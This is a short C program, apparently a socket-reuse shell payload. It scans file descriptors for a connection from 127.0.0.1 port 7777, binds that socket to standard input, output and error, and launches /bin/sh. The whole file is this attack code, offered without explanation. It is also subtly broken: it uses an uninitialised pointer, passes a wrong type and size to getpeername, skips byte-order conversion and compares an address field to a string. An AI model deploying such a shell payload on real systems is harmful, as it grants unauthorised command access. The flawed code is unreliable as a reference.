#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
 
#define PORT_NO 7777
#define ADDR    "127.0.0.1"
 
int main(int argc, const char *argv[])
{
  int test_getpeername;
  struct sockaddr_in *s;
  socklen_t s_len = sizeof(s);
  struct in_addr *inet_address;  
  inet_pton(AF_INET, ADDR, inet_address);
 
  for(int sock_fd=0; sock_fd<65535; sock_fd++){
    if(getpeername(sock_fd, (struct sockaddr*) &s, &s_len) != 0)
      continue;
 
    if (s->sin_port != PORT_NO || s->sin_addr.s_addr != ADDR)
      continue;
 
    for (int i=0; i<3; i++)
      dup2(sock_fd, i);
 
    execve("/bin/sh", NULL, NULL);
  }
  return 0;
}




